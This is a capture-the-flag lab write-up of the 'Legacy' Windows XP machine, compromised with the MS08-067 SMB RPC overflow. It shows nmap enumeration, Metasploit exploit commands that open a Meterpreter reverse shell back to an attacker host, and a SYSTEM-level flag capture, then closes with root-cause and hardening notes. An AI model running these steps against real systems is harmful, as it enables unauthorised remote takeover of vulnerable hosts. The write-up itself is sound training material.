# Legacy

<img src="../assets/icons/legacy.png" width="100">

**Difficulty:** Easy
**OS:** Windows

## Overview

Legacy is a Windows XP SP3 box exposing only SMB/RPC services. The name is a hint — this machine is built around **MS08-067**, one of the most well-known pre-authentication remote code execution vulnerabilities in Windows networking history, and a rite of passage for anyone learning offensive security fundamentals.

## Enumeration

An initial `nmap -sC -sV` scan showed a minimal attack surface — only three ports open, all core Windows networking services:

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```

The `smb-os-discovery` NSE script confirmed the OS outright:

```
OS: Windows XP (Windows 2000 LAN Manager)
Computer name: legacy
Workgroup: HTB
```

Notably, `smb-security-mode` flagged **message signing as disabled**:

```
smb-security-mode:
  account_used: guest
  authentication_level: user
  challenge_response: supported
  message_signing: disabled (dangerous, but default)
```

Between the confirmed Windows XP SP3 fingerprint and the SMBv1-only, signing-optional configuration, this pointed strongly at a legacy SMB RPC vulnerability rather than any service misconfiguration or credential-based path in.

## Exploitation

Verified the OS/build precisely with Metasploit's SMB version scanner before committing to an exploit:

```
msf auxiliary(scanner/smb/smb_version) > run
[+] [TARGET_IP]:445 - Host is running Windows XP SP3 (language:English)
```

This confirmed the target as a match for `exploit/windows/smb/ms08_067_netapi`, which targets a stack-based buffer overflow (**CVE-2008-4250**) in the Server service's `NetprPathCanonicalize` RPC function, reachable pre-auth over the `BROWSER` or `SRVSVC` named pipe.

```
msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS [TARGET_IP]
msf exploit(windows/smb/ms08_067_netapi) > set LHOST [ATTACKER_IP]
msf exploit(windows/smb/ms08_067_netapi) > check
[+] [TARGET_IP]:445 - The target is vulnerable.
msf exploit(windows/smb/ms08_067_netapi) > exploit
```

Automatic targeting correctly fingerprinted the exact build and language, selecting `Windows XP SP3 English (AlwaysOn NX)`, and the module fired cleanly:

```
[*] [TARGET_IP]:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] [TARGET_IP]:445 - Attempting to trigger the vulnerability...
[*] Sending stage (196678 bytes) to [TARGET_IP]
[*] Meterpreter session 1 opened ([ATTACKER_IP]:4444 -> [TARGET_IP]:1032)
```

## Post-Exploitation

No privilege escalation was required — the exploit lands directly in the SYSTEM context, since the vulnerable Server service runs with those privileges:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
Domain          : HTB
```

Both flags were retrieved directly from an interactive shell:

```
meterpreter > shell
C:\Documents and Settings\john\Desktop> type user.txt
C:\Documents and Settings\Administrator\Desktop> type root.txt
```

## Root Cause

`NetprPathCanonicalize`, part of the Server service's RPC interface, failed to properly validate path lengths before copying data into a fixed-size stack buffer, allowing a crafted RPC request to overwrite the return address and achieve arbitrary code execution.

Because the vulnerable function is reachable via named pipes over SMB with no authentication required, and because the Server service runs as `NT AUTHORITY\SYSTEM`, successful exploitation grants full SYSTEM-level code execution in a single step — no credential harvesting, lateral movement, or local privesc needed.

## Lessons Learned

- SMBv1 with signing disabled is a strong signal to check for legacy pre-auth RPC exploits before looking anywhere else.
- Always verify OS/build/language precisely (via a scanner module or banner grab) before firing an exploit with hardcoded, build-specific return addresses — Metasploit's automatic targeting handled this correctly here, but it isn't guaranteed to on every box.
- A useful reminder of why SMBv1 deprecation and mandatory signing became default hardening recommendations industry-wide.